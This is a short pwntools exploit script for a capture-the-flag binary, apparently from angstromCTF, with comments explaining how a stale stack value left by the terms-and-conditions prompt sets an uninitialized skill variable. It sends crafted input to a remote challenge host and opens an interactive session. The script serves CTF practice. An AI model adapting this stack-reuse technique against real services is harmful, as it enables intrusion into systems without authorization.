from pwn import *

local_bin = "./raiid_shadow_legends"
elf = ELF(local_bin)
rop = ROP(elf)


'''
main+210 = first scan for what to do
main+250 = terms_and_condition
terms_and_conditions()+350 = scanf
main+255 = play

play()+106 probably can overflow --->? scans into a pointer to a string (0x7fffffffe490)
0x7fffffffe484 here looks like stores player.skill
terms_and_conditions()+256

vulnerability: 
skill is not initialized, when scanning for agree to terms and condition, it is written into the same stack sapce

exploit:
sends a invalid term and condition, overwriting skill level
sends valid term and condition

'''
#p = gdb.debug(local_bin, '''
	#break main
	#break *terms_and_conditions+256
	#break *terms_and_conditions+350
	#break *main+210
	#break *main+250
	#break *main+255
	#break *play+199
	#break *play+106
	#break *play+167
	#continue
	#''')

p = remote( "shell.actf.co" , 21300)

p.recvuntil(b"do?")
p.sendline(b"1")

p.recvuntil(b"conditions")
p.sendline(b"aaaa\x39\x05")
p.recvuntil(b"conditions")
p.sendline(b'yes')
#p.interactive()


p.recvuntil(b"here:")
p.sendline(b"aaaaaa")

p.recvuntil(b"name")
p.sendline(b"aaaa")

p.sendline(b"2")

p.interactive()